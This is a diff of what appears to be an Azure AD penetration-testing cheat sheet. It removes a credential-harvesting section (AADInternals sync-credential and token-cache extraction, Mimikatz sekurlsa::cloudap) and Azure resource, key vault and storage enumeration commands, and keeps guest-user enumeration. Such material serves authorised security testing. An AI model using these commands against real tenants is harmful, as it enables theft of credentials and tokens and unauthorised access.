@@ -166,37 +166,10 @@ Get-AzureADUser -Filter "UserType eq 'Guest'" -All $true |
 Get-AzureADMSGroup -All $true | Where-Object {$_.GroupTypes -contains "DynamicMembership"}
 ```
 
-## Credential Harvesting
-
-
-```
-# If you have access to Azure AD Connect server
-Import-Module AADInternals
-Get-AADIntSyncCredentials
-
-# Mimikatz for Azure tokens
-privilege::debug
-sekurlsa::cloudap
-
-# Browser token extraction
-Get-AADIntAccessTokenFromCache
-```
 
 ## Lateral Movement Commands
 
 ```
-# Enumerate Azure resources with current creds
-Connect-AzAccount
-Get-AzResource
-Get-AzVM
-Get-AzStorageAccount
-Get-AzKeyVault
-
-# Try accessing storage accounts
-Get-AzStorageAccount | ForEach-Object {
-    $ctx = New-AzStorageContext -StorageAccountName $_.StorageAccountName
-    Get-AzStorageContainer -Context $ctx
-}
 
 # Check Azure DevOps access
 az devops login
